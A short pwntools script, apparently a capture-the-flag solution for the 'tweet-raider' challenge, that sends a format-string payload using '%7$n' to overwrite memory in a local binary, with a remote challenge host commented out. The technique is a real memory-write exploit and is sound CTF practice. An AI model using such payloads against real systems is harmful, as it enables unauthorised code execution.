from pwn import *

context.terminal = ['gnome-terminal','--window','-e']
context.log_level = 'DEBUG'
#for local
sh = gdb.debug("./tweet-raider")
#for remote
#sh = remote("pwn.ctf.b01lers.com",1004)
#payload = cyclic(20)+' %p '*20
#payload = 'a'*200+'%7$n'
payload = 'a'*20+' %7$9000p '+'%7$n'
sh.sendlineafter("Tweet: ",payload)
sh.interactive()
